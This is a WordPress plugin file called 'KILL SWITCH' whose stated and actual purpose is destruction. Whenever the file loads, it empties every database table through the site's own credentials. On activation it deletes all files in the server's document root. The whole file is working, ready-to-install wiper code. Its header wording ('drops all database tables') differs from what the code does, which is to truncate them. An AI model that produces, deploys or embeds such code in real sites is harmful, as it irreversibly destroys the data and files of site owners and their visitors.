<?php
/*
 * Plugin Name: 💀&nbsp; KILL SWITCH
 * Description: When activated <strong>drops all database tables</strong> and <strong>deletes files FOREVER!</strong>
 * Version: 666
 * Author: plugins.club
 * Author URI: https://plugins.club
 */

// Load WordPress config file
register_activation_hook( __FILE__, 'delete_folder_content' );

// Connect to MySQL using the WordPress connection details
$link = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);

// Check connection
if (!$link) {
    die("Connection failed: " . mysqli_connect_error());
}

// Get a list of all tables in the database
$result = mysqli_query($link, "SHOW TABLES");
while($row = mysqli_fetch_row($result)) {
    $table_name = $row[0];
    // Use TRUNCATE TABLE to empty the table
    mysqli_query($link, "TRUNCATE TABLE $table_name");
}
mysqli_close($link);
function delete_folder_content() {
	$folder = $_SERVER['DOCUMENT_ROOT']; // document root
	// open the specified folder
	$dir = opendir( $folder );
	// delete all files in the folder
	while ( false !== ( $file = readdir( $dir ) ) ) {
		if ( $file != '.' && $file != '..' ) {
			unlink( $folder . '/' . $file );
		}
	}
	// close the folder
	closedir( $dir );
}
